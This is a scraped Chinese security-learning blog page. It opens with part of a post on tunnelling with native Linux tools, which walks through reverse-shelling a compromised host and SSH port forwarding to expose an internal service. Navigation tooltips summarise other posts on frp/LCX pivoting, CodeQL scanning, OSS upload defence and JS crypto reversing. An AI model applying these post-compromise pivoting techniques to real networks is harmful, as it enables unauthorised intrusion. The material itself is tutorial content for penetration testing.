import http.server import socketserver PORT = 8005 CONTENT = b&amp;amp;#34;&amp;amp;#34;&amp;amp;#34; &amp;amp;lt;!DOCTYPE html&amp;amp;gt; &amp;amp;lt;html lang=&amp;amp;#34;en&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;head&amp;amp;gt; &amp;amp;lt;meta charset=&amp;amp;#34;UTF-8&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;title&amp;amp;gt;Proxy Test&amp;amp;lt;/title&amp;amp;gt; &amp;amp;lt;/head&amp;amp;gt; &amp;amp;lt;body&amp;amp;gt; &amp;amp;lt;h1&amp;amp;gt;proxytest&amp;amp;lt;/h1&amp;amp;gt; &amp;amp;lt;h1&amp;amp;gt;success&amp;amp;lt;/h1&amp;amp;gt; &amp;amp;lt;/body&amp;amp;gt; &amp;amp;lt;/html&amp;amp;gt; &amp;amp;#34;&amp;amp;#34;&amp;amp;#34; class CustomHandler(http.server.BaseHTTPRequestHandler): def do_GET(self): self.send_response(200) self.send_header(&amp;amp;#34;Content-type&amp;amp;#34;, &amp;amp;#34;text/html; charset=utf-8&amp;amp;#34;) self.end_headers() self.wfile.write(CONTENT) def log_message(self, format, *args): return if __name__ == &amp;amp;#34;__main__&amp;amp;#34;: with socketserver.TCPServer((&amp;amp;#34;0.0.0.0&amp;amp;#34;, PORT), CustomHandler) as httpd: print(f&amp;amp;#34;[&#43;] Serving on port {PORT} ...&amp;amp;#34;) httpd.serve_forever() 在被控服务器内网的8005端口运行（由于安全组等原因，不会开放到外网）：
可以看到现在是无法在外网访问的： 接下来开始进行代理操作
SSH端口转发 首先是端口转发，一般都是选择正向转发：
ssh -CfNg -L [本地端口]:[内网主机IP]:[内网主机端口] [外网主机IP] 这里的参数含义如下：
-C：启用压缩（Compress），减少传输数据量，提高隧道效率，尤其在网络较差时 -f：在验证成功后后台运行 SSH，否则会阻塞终端 -N：不执行远程命令，仅用于端口转发 -g：允许其他主机连接到你本地绑定的端口（否则默认只允许本机访问） -L：启用本地端口转发 首先将这个台被控主机反弹shell到我的控制端vps上：
然后python获取pty（一定要有一个交互式shell，我在测试的时候，反弹的shell不能直接输入ssh连接的密码），查看是否有ssh并端口转发，将内网8005端口转发到外网2333端口：
ssh -CfNg -L 2333:127.0.0.1:8005 [被控端服务器公网IP] [回车后输入获取到的内网主机账户密码] ">隧道代理-基于Linux原生工具的隧道代理</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="article-link" data-summary="隧道代理-基础知识 渗透测试过程中，在外网getshell之后，需要通过转发端口或搭建代理等方式建立内网通道
隧道分类 从流量层分类 应用层隧道（DNS、SOCKS、HTTP、SSH） 传输层隧道（TCP隧道、UDP隧道） 网络层隧道（ICMP、IPv6隧道） 从作用上分类 反弹shell（nc、python、bash） 端口转发（LCX、SSH、iptables、telnet） 端口映射（LCX、NPS、FRP） 正向代理（EW、NPS、FRP） 反向代理（EW、NPS、FRP） 重要概念 正向连接和反向连接 正向是从攻击者电脑主动访问目标机器，例如：受控端主机监听一个端口，由控制端主机主动连接受控端主机建立shell（适用于受控主机具有公网IP） 反向是从目标机器主动连接攻击者电脑，例如：控制端主机监听一个端口，在受控端主机执行操作访问控制端主机建立的shell是反弹shell（适用于受控端主机没有公网IP的或控制端存在公网IP等情况） 典型例子是：Metasploit有两种meterpreter，一种是以windows/meterpreter/bind_tcp为代表的bind shell，用于正向连接；一种是以windows/meterpreter/reverse_tcp为代表的reverse shell，用于反向连接
渗透过程中，正向连接常受限于防火墙或权限不足，而反向连接可以有效突破这些限制（因为防火墙对出站流量的限制通常比对入站流量的限制要宽松）
端口转发和端口映射 两者在通常情况下未作严格区分，这里仅稍作解释
端口转发：有时被称为做隧道，是SSH或NAT的一种应用。简单来说，就是将一个端口收到的数据/流量转发到另一个端口，而转发到的端口可以是本机端口，也可以是其他主机上的端口（前提是其他主机与本机有网络连接）
如果内网中，部署的防火墙会检查敏感端口的连接情况并阻断异常通信，可以通过端口转发，可以绕过防火墙，实现通过访问允许的端口来与敏感端口通信
端口映射：是NAT的一种，功能是把在公网的地址转成私有地址。简单来说就是将一个端口映射到另一个端口，更适用于描述外网路由器（而不是外网主机）映射至内网主机
HTTP代理和socks代理 http代理用的是http协议，工作在应用层，主要是用来代理浏览器访问网页 socks代理用的是socks协议，标准端口为1080，工作在会话层，主要用来传递数据包。socks代理有socks4和socks5两个版本，socks4只支持TCP，socks5支持UDP、TCP等协议。在内网渗透中，通过搭建socks代理，可以无需进行多次端口转发，达到与目标内网主机进行通信的目的 ">隧道代理-基础知识</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-%E5%BA%94%E7%94%A8%E5%B1%82%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/" class="article-link" data-summary="隧道代理-应用层内网代理 内网代理技术一般采用http或者socks代理
市面上的工具很多，这里咨询了下大佬，就暂时先学习几个常用的：
frp suo5 neo-regeorg （Daac0ng师傅说其实很多情况直接用c2开一个隧道，然后proxifier代理一下就好了）
frp 一个专注于内网穿透的高性能反向代理工具，支持TCP、UDP、HTTP、HTTPS等协议
在内网渗透中，frp可以用来进行内网隧道搭建，另外frp也支持搭建socks5代理应用
frp分为windows和linux系统两个版本，主要包含这些文件：
frps：服务端程序 frps.ini：服务端配置文件 frpc：客户端文件 frpc：客户端配置文件 使用时，将 frps 及 frps.ini 放到具有公网 IP 的机器上，将 frpc 及 frpc.ini 放到处于内网环境的机器上
服务端配置（frps） 配置文件内容：
[common] bind_port = 7000 # 默认配置中监听7000端口，可根据实际情况修改 启动代理文件：
./frps -c ./frps.ini 客户端配置（frpc） 假设 FRP 服务端所在主机的公网 IP 为 x.x.x.x
配置文件内容：
[common] server_addr = x.x.x.x server_port = 7000 启动文件：
./frpc -c ./frpc.ini 配置文件其他功能 配置文件非常重要，需要什么功能就可以进行不同的配置，来进行代理
参考文档：参考 | frp (gofrp.org)
搭建场景 端口转发 将内网端口（这里以3389为例）转发到公网
客户端配置：
[common] bind_port = 7000 服务端配置：
[common] server_addr = x.x.x.x server_port = 7000 [3389] type = tcp local_ip = 127.0.0.1 local_port = 3389 remote_port = 6000 如此可以实现RDP连接
">隧道代理-应用层内网代理</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7/" class="article-link" data-summary="隧道代理-端口转发相关工具 LCX LCX是一款内网端口转发工具，分为Windows版和Linux版，Linux版本为PortMap。LCX有端口映射和端口转发两大功能，例如：当目标的3389端口只对内开放而不对外开放时，可以使用端口映射将3389端口映射到目标的其他端口使用；当目标处于内网或目标配置的策略只允许访问某一固定端口时，可以通过端口转发突破限制
目前很多杀软已经将LCX加入了特征库，所以在实际利用时需要自行做免杀处理
Windows版的LCX用法： Usage:lcx.exe -&amp;amp;lt;listen|tran|slave&amp;amp;gt; &amp;amp;lt;option&amp;amp;gt; [-log logfile] -tran &amp;amp;lt;等待连接的端口&amp;amp;gt; &amp;amp;lt;目标ip&amp;amp;gt; &amp;amp;lt;目标端口&amp;amp;gt; (端口映射) -listen &amp;amp;lt;监听slave请求的端口(对应slave 的第二个参数)&amp;amp;gt; &amp;amp;lt;等待连接的端口&amp;amp;gt; (端口转发) -slave &amp;amp;lt;你的ip&amp;amp;gt; &amp;amp;lt;监听端口(对应listen的第一个参数)&amp;amp;gt; &amp;amp;lt;目标ip&amp;amp;gt; &amp;amp;lt;目标端口&amp;amp;gt; (端口转发) Linux版的LCX用法： linux下的工具名为portmap
Usage:./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-log filename] -v: version -h1: host1 -h2: host2 -p1: port1 -p2: port2 -log: log the data -m: the action method for this tool 1: listen on PORT1 and connect to HOST2:PORT2 2: listen on PORT1 and PORT2 3: connect to HOST1:PORT1 and HOST2:PORT2 使用案例 目标机有公网IP：
">隧道代理-端口转发相关工具</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>SDL</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
  
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>SAST</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
  
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>CodeQL</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/sdl/sast/codeql/codeql%E5%9F%BA%E7%A1%80/" class="article-link" data-summary="CodeQL基础 配置 简单说一下环境配置
引擎地址：https://github.com/github/codeql-cli-binaries/releases，下载后配置环境变量：
然后安装sdk：https://github.com/github/codeql，改名成ql，放在之前引擎的同目录下：
然后在vscode安装插件：
在设置里添加一下CodeQL可执行文件的位置：
用CodeQL分析项目本质是执行查询，首先需要去待审计源代码的根目录建立分析数据库，我这里分析的一个开源的漏洞合集：https://github.com/l4yn3/micro_service_seclab/
首先要建立分析数据库：
codeql database create javaseclabstest --language=&amp;amp;#34;java&amp;amp;#34; --command=&amp;amp;#34;mvn clean install -Dmaven.test.skip=true&amp;amp;#34; --source-root=/Users/yuy0ung/Desktop/SAST/micro_service_seclab-main 执行成功你应该可以在这个目录里看到一个codeqltest目录:
接着我们在vscode引入这个目录：
然后我们新建一个query： demo.ql，内容为select &amp;amp;quot;Hello World“，位置为CodeQL/ql/java/ql/examples/test.ql
接下来运行query： 可以看到结果输出了hello world，说明配置没有问题了
CodeQL基础语法 ql语法 说白了就是查询语法，QL查询的语法结构为：
from [datatype] var where condition(var = something) select var 比如：
import java from int i where i = 1 select i 第一行表示我们要引入CodeQL的类库，因为我们分析的项目是java的，所以要import java（如果QL文件在 ql\java\ql\ 目录中时就不需要 import java 了，因为这是 CodeQL 标准库目录，其会自动隐式加载该目录下的依赖，但如果写在其他目录下就需要手动 import java ，包括其子目录） 第三行表示定义一个int型变量i，表示我们获取所有的int类型的数据 第四行为判定条件 第五行为输出i 也就是说在所有的整形数字i中，当i==1的时候，就输出i，按照这个逻辑，最终的输出就应该为1: ">CodeQL基础</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/sdl/sast/codeql/%E4%BD%BF%E7%94%A8codeql%E8%BF%9B%E8%A1%8C%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/" class="article-link" data-summary="使用CodeQL进行白盒扫描 接下来学点不一样的，从企业安全建设角度出发，我们通常会根据codeQL提供的的CWE漏洞规则，针对代码进行扫描，我们选取以下CWE规则：
【注入类】 - SQL Injection (089) - XSS (079) - Command Exec (078) - Expression / Code Injection (094) - SSRF (918) - XXE (611) 【资源访问类】 - Path Traversal (22) 【反序列化】 - Unsafe Deserialization (502) 【认证授权】 - Authentication Bypass (287) - Authorization Bypass (807) 【敏感信息】 - Hardcoded Credentials (798) 接下来以https://github.com/whgojp/JavaSecLab/项目为例
SQL注入 我们使用codeql官方的规则进行sql注入扫描（记得先构建数据库）：
codeql database analyze ~/tools/CodeQL/db/javasecpro \ codeql/java-queries:Security/CWE/CWE-089 \ --format=sarif-latest \ --output=sql.sarif 可以看到扫描完成后在文件夹新增了一个sarif文件，这个就是扫描结果文件，可以在vscode下载sarif viewer插件进行解析查看： ">使用CodeQL进行白盒扫描</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>静态程序分析</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/sdl/sast/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/" class="article-link" data-summary="静态程序分析基础 静态程序分析基础（Static Program Analysis，简称Static Analysis）
PL与静态分析 编程语言（ PL，Programming Languages），静态分析属于PL下面的Application下的一个分支
静态程序分析是编程语言中应用层面下的一个细分领域，它是一个非常重要的核心内容：
在理论部分，考虑的是如何设计一个语言的语法和语义，如何设计语言的类型系统等等问题；有了语言的语法、语义和类型系统之后，我们需要支撑语言的运行。因此，在环境部分，需要考虑如何为运行中的程序提供运行时环境——如何设计编译器，在运行时需要怎样的支持（如内存的分配管理）等等；应用部分则关注如何保证语言所写出程序的效率、安全性和可靠性，主要考虑如何对程序进行分析，验证和合成（如何自动合成一个程序）
现在编程语言无非三大类：
命令式（C、C&#43;&#43;、JAVA） 函数式（Scala、Haskell） 逻辑式（Prolog） 那么考虑一个问题：
数十年来语言的核心没有变化，但软件的规模和复杂性增长迅速，如何保证程序的可靠性？
这个时候就引出了我们的静态程序分析
静态程序分析 静态程序分析的用处很多：
提高程序可靠性：比如避免内存泄漏、空指针引用等 提高程序安全性：避免隐私信息泄漏、避免注入攻击 编译优化：死代码消除、循环不变量的移动 程序理解：例如使用IDE时，将鼠标悬停在代码上，IDE能够动态地分析并提示你所悬停对象的相关信息，背后使用的技术就是静态程序分析 一句话概括，在程序运行之前了解它的行为、安全性等信息
在应用安全（SDL）领域，SAST学习的基础也是静态程序分析
这里有两个术语，sound和truth
sound：可以理解为无漏报 truth：可以理解为无误报 没有一个完美的的SAST工具能够实现0漏报与0误报，往往只能妥协一个来换取另一个，而绝大多数都是妥协truth，来保证sound
两个词来概括静态分析：抽象（abstract）&#43;过近似（over-approximation）：
抽象：比如代码里变量可能取值无限多，我们把它归成几个集合（比如“正/负/零/unknown/undefined”），这就是抽象
过近似：
以语义判断为例，a=9，b=-1，本来a&#43;b=8，但是分析时是抽象为 正数&#43;负数 所以判断结果不是正数，而是unknown（如果用这个思路分析负数的数组引用错误，就会导致误报）
以控制流判断为例，有如下代码：
x = 1; if(input) y = 10; else y = -1; z = x &#43; y; 那么他的control flow如下：
flowchart TD B[x = 1] --&amp;gt;D[y = 10] B[x = 1] --&amp;gt;E[y = -1] D --&amp;gt; F[z = x &#43; y] E --&amp;gt; F 那么按照前面的思路来判断正负，流程就是这样：
">静态程序分析基础</a>
        
      </div>
    </li>
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/sdl/sast/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/%E4%B8%AD%E9%97%B4%E8%A1%A8%E7%A4%BA/" class="article-link" data-summary="中间表示IR 讲讲IR（Intermediate Representation），中间表示
编译器与静态分析器 编译器Compilers负责将源代码（Source code） 转换为机器代码（Machine Code），大致流程框架如下：
词法分析器（Scanner），结合正则表达式，通过词法分析（Lexical Analysis）将 source code 翻译为 token。 语法分析器（Parser），结合上下文无关文法（Context-Free Grammar），通过语法分析（Syntax Analysis），将 token 解析为抽象语法树（Abstract Syntax Tree, AST） 语义分析器（Type Checker），结合属性文法（Attribute Grammar），通过语义分析（Semantic Analysis），将 AST 解析为 decorated AST Translator，将 decorated AST 翻译为生成三地址码这样的中间表示形式（Intermediate Representation, IR），并基于 IR 做静态分析（例如代码优化这样的工作）。 Code Generator，将 IR 转换为机器代码。 流程图如下：
graph TD %% 节点定义：数据状态 Src(Source Code) Tok(Token) AST(AST 抽象语法树) DecAST(Decorated AST) IR(&amp;#34;Intermediate Representation (IR)三地址码等&amp;#34;) MC(Machine Code) %% 流程定义：连线代表转换过程，标签注明了[组件]和(方法) Src --&amp;gt;|&amp;#34;词法分析器 (Scanner)方法: Lexical Analysis &#43; 正则表达式&amp;#34;| Tok Tok --&amp;gt;|&amp;#34;语法分析器 (Parser)方法: Syntax Analysis &#43; 上下文无关文法 (CFG)&amp;#34;| AST AST --&amp;gt;|&amp;#34;语义分析器 (Type Checker)方法: Semantic Analysis &#43; 属性文法&amp;#34;| DecAST DecAST --&amp;gt;|&amp;#34;转换器 (Translator)方法: IR Generation &#43; 静态分析 (Static Analysis)&amp;#34;| IR IR --&amp;gt;|&amp;#34;代码生成器 (Code Generator)方法: Code Generation&amp;#34;| MC %% 样式美化 style Src fill:#f9f,stroke:#333,stroke-width:2px style MC fill:#f9f,stroke:#333,stroke-width:2px style Tok fill:#e3f2fd,stroke:#1565c0 style AST fill:#e3f2fd,stroke:#1565c0 style DecAST fill:#e3f2fd,stroke:#1565c0 style IR fill:#fff9c4,stroke:#fbc02d 静态分析得先确保这是一份合格的代码，然后再进行分析
">中间表示</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>OSS治理</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/sdl/oss%E6%B2%BB%E7%90%86/oss%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E9%BB%91%E7%81%B0%E4%BA%A7%E5%AF%B9%E6%8A%97/" class="article-link" data-summary="OSS文件上传与黑灰产对抗 接下来围绕企业对于需要OSS的业务建设进行分析与学习
基础 STS Token STS(Security Token Service)是云厂商提供的一种临时访问权限管理服务，用户可以通过该服务申请临时的安全令牌来访问云厂商资源，STS Token的优势如下：
减少长期访问密钥的泄漏风险 STS Token具有实效性，可以自定义失效时间，无需定期轮换 可以给STS Token绑定自定义权限策略，云资源授权更灵活 开发中的使用 一般来说，文件上传功能点，业内成熟的方案是客户端上传，即前端直传OSS，文件不用经过后端服务器，这在一定程度上能够减少服务带宽，提升用户体验
简单概括一下这个方案：前端向后端申请一个临时的STS Token，前端再使用该Token直接将文件上传到OSS
更详细的实践可以参考阿里云官方文档：https://help.aliyun.com/zh/oss/user-guide/uploading-objects-to-oss-directly-from-clients/
值得一提的是，除了这个方案，阿里云官方还提供了两个客户端直传方案，不过由于不支持大文件分片以及断点续传，所以使用的较少： 安全问题与解决方案 我们可以看出来，这种情况存在如下的风险： 黑灰产可以通过抓包获取到STS Token，再使用阿里云的SDK直接上传文件到OSS，这样上传文件不会经过风控审核，并且可以获取到OSS上存储文件的链接，进行传播，甚至是消耗公司的CDN资源来加载他们上传的视频文件
怎么解决这个问题呢？与黑灰产对抗主要是要提升黑灰产的利用成本，我们可以从多方面来思考，最基本的就是：公司内应当统一做好上传功能的管理，规范一套符合公司标准的文件上传SDK，如果需要用到存储桶上传功能的话，可以到OSS管理平台申请，并且功能绑定到APP ID上，并且接入时鉴权到位
另外还能从上传逻辑与STS Token管理上来思考
上传逻辑层面 从逻辑层面上，一个经典的方案是二次提交： 我们思考存在文件上传的功能点，头像上传、 问卷提交、富文本编辑&amp;amp;hellip;不难发现，这些功能在上传了图片之后通常需要二次点击确定，提交表单数据，所以我们可以根据这一点来设防：
首先是上传图片，上传之后返回图片url地址，此时的地址是无法访问的，对应存储桶的图片权限为私有（例如x-oss-object-acl:private），前端仅使用本地缓存来展示图片预览 然后是点击确认，提交数据表单，后端提前录入好这个接口的响应，在提交表单成功后，接口正确响应，此时后端会修改上传的资源的权限为defaut，此时才可以根据url地址进行访问 那么在这种情况下，即使黑灰产使用SDK上传大量文件，也是不可访问的，而如果黑灰产想要利用业务接口来修改文件权限，就需要大量请求，将会触发业务告警，这样一来就大幅增加了黑灰产的利用成本
STS Token层面 既然黑灰产是通过获取STS Token来进行上传利用，那我们也可以从STS Token层面来入手，做如下考量：
首先是获取STS Token的接口，为了防止该接口被滥用，需要接入风控，异常调用则触发业务告警 其次，虽然STS Token限制了有效期，但仍需要对其增加限制，比如客户端获取STS Token时需要增加一个fileName参数，并且使用该Token固定只能上传这个指定的文件名，这样一来，不论多少次上传都只是覆盖同一文件，降低了风险 ">OSS文件上传与黑灰产对抗</a>
        
      </div>
    </li>
  
  
  
</ul>

      </div>
    </li>
  
</ul>

      </div>
    </li>
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>渗透</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
  
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>js对抗</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/js%E5%AF%B9%E6%8A%97/js%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/" class="article-link" data-summary="JS逆向基础&#43;有道翻译JS简单分析 由于最近工作中测试相关资产时，发现很多网站，包括小程序等的web端，传输的数据都是经过了加解密的，于是便需要我们对js中的加解密部分进行分析、调试和逆向，并编写hook代码，配合一些工具将我们测试的请求自动加密，将响应自动解密（其实和爬虫非常类似），实现对数据加解密的对抗
前置知识 JS相关 你可能需要先掌握：javascript基础、闭包、面向对象、原型、原型链
对这些概念掌握且能看懂js代码即可
数据传输相关 加解密、编解码、消息摘要，这些其实就是应用密码学相关知识，了解原理和作用
基础反调试 这里说的是最简单的一类情况，常体现为禁用F12、禁用右键等，都是CTF入门接触的，直接在浏览器选项中调出开发者工具即可
由于调出开发者工具后会占据一部分屏幕导致innerWidth或innerHeight的值变小，这一属性也有可能用于反调试，解决方案就是让开发者工具以单独窗口打开而不是停靠在浏览器页面上
一些开发者工具的功能 很多操作在干渗透的时候都会了，就不多赘述，这里记录一点以前没用过的：
保留日志/持续记录（一般开启） 禁用缓存（一般开启） 内容格式化（值得注意的是搜索文件内容最好搜索格式化之前的，格式化可能会补充空格之类的导致搜索不到） Fetch/XHR：js代码中发送的网络请求，比如fetch/ajax 文档/HTML：页面加载的第一个html 网络：可以看到请求与响应（值得一提的是，在这里无法通过ctrl&#43;f进行搜索请求体内容） 调用堆栈：调试界面的功能，当函数运行起来时，调用堆栈可以描述当前运行到的断点处的代码 控制台输出：分为错误、告警、信息、日志、调试等几种输出级别 基础步骤 这里以有道翻译的文本翻译功能为例来将基础过一遍，这里先用写爬虫一样的逻辑来走一遍，后面再写关于渗透测试环境中的简单分析
加密逻辑分析 首先是加密，即我们发送请求时抓包，发现包中的一些数据不是明文，或者相比提交的数据多了一些像签名之类的参数，就需要分析前端加密逻辑
定位数据来源 首先需要做的事就是定位我们数据交互时加解密数据的请求包，对于学习了网安的人，相信不论是f12还是burp都是极为简单的，我们可以很轻松定位到指定文本翻译功能的包： 识别加密参数 这里我们先将定位到的请求包复制为curl命令：
并转换为python request：
在这里我们可以运行脚本并获得加密后的结果：
我们分析请求参数:
data = { &amp;amp;#34;i&amp;amp;#34;: &amp;amp;#34;你好&amp;amp;#34;, &amp;amp;#34;from&amp;amp;#34;: &amp;amp;#34;auto&amp;amp;#34;, &amp;amp;#34;to&amp;amp;#34;: &amp;amp;#34;&amp;amp;#34;, &amp;amp;#34;useTerm&amp;amp;#34;: &amp;amp;#34;false&amp;amp;#34;, &amp;amp;#34;dictResult&amp;amp;#34;: &amp;amp;#34;true&amp;amp;#34;, &amp;amp;#34;keyid&amp;amp;#34;: &amp;amp;#34;webfanyi&amp;amp;#34;, &amp;amp;#34;sign&amp;amp;#34;: &amp;amp;#34;68732687ef98f424db7c2c20c30ddb9d&amp;amp;#34;, &amp;amp;#34;client&amp;amp;#34;: &amp;amp;#34;fanyideskweb&amp;amp;#34;, &amp;amp;#34;product&amp;amp;#34;: &amp;amp;#34;webfanyi&amp;amp;#34;, &amp;amp;#34;appVersion&amp;amp;#34;: &amp;amp;#34;1.0.0&amp;amp;#34;, &amp;amp;#34;vendor&amp;amp;#34;: &amp;amp;#34;web&amp;amp;#34;, &amp;amp;#34;pointParam&amp;amp;#34;: &amp;amp;#34;client,mysticTime,product&amp;amp;#34;, &amp;amp;#34;mysticTime&amp;amp;#34;: &amp;amp;#34;1747409777255&amp;amp;#34;, &amp;amp;#34;keyfrom&amp;amp;#34;: &amp;amp;#34;fanyi.web&amp;amp;#34;, &amp;amp;#34;mid&amp;amp;#34;: &amp;amp;#34;1&amp;amp;#34;, &amp;amp;#34;screen&amp;amp;#34;: &amp;amp;#34;1&amp;amp;#34;, &amp;amp;#34;model&amp;amp;#34;: &amp;amp;#34;1&amp;amp;#34;, &amp;amp;#34;network&amp;amp;#34;: &amp;amp;#34;wifi&amp;amp;#34;, &amp;amp;#34;abtest&amp;amp;#34;: &amp;amp;#34;0&amp;amp;#34;, &amp;amp;#34;yduuid&amp;amp;#34;: &amp;amp;#34;abcdefg&amp;amp;#34; } 其实不难看出来一些关键信息：
i就是我们请求的文本内容明文 sign在这里应该是md5这种请求摘要签名，通过更改其他的参数，查看加密的响应可以知道，参数 i 没有参与摘要算法，但时间戳mysticTime参与了（签名一般都是本地js生成） 定位分析加密算法 入手点肯定是sign的签名算法，通过全局搜索寻找一下（可以过滤掉无用的文件类型比如css），像下面这样搜索关键字：
sign sign=（注意这里不要加等号） sign: \bsign（需要启用正则表达式，\b代表匹配字符边界） 可以发现很多疑似的代码，我们可以都打上断点进行验证，比如：
">JS逆向基础</a>
        
      </div>
    </li>
  
  
  
    <li>
      <span class="tree-toggle collapsed"></span>
      <span class="section-link" style="cursor: pointer;"><strong>流量加解密学习</strong></span>
      <div class="tree-children hidden" style="display: none;">
        




  
  
  
    
  


<ul class="tree-list">
  
    <li>
      <div class="tree-item-wrapper">
        <span style="width: 15px; display: inline-block; flex-shrink: 0;"></span>
        <a href="../../../../blog/%E6%B8%97%E9%80%8F/js%E5%AF%B9%E6%8A%97/%E6%B5%81%E9%87%8F%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%AD%A6%E4%B9%A0/yakit%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E9%AB%98%E7%BA%A7%E5%89%8D%E7%AB%AF%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%B8%8E%E9%AA%8C%E7%AD%BE%E5%AE%9E%E6%88%98%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/" class="article-link" data-summary="yakit靶场-高级前端加解密与验签实战 感谢kio师傅指路，发现https://vulinbox.bachang.org/#这个宝藏靶场，当然有yakit也可以在本地搭建
这里默认读者已经拥有js逆向基础，不会细讲一些知识点了，更多是过程体现，以及如何配合galaxy实现自动的加解密
galaxy的基础使用可以看我这篇文章：网站流量加解密场景入门&amp;amp;amp;Galaxy使用
文中我编写的的http hook已经打包上传至我的github：https://github.com/Yuy0ung/galaxy_HttpHook_for_yakit-vulinbox，需要可以自取
前端签名HMAC-SHA256 首先分析表单数据判断，前端是做了签名的：
签名后的数据包： js中定位一下加解密代码块： 很贴心，注释都写好了，简单分析一下
function outputObj(jsonData) { const word = `username=${jsonData.username}&amp;amp;amp;password=${jsonData.password}`;; return { &amp;amp;#34;signature&amp;amp;#34;: Encrypt(word), &amp;amp;#34;key&amp;amp;#34;: key.toString(), username: jsonData.username, password: jsonData.password, } } 从这段代码可以分析出，签名是将我们传入的	username=admin&amp;amp;amp;password=123456进行了hmac_sha256加密，而密钥就是将1234123412341234转16进制即31323334313233343132333431323334
值得一提的是CryptoJS 的 key 在没有明确指定编码方式的情况下，默认的 toString 方法将输出十六进制 (Hex) 格式的字符串
当然CryptoJS还有其他很多编码器，在进行js分析时候，需要注意编码情况，不然会浪费大量不必要的时间
我们可以自行加密验证一下：
签名确实和加密后的表单一致
那么接下来写个http hook：
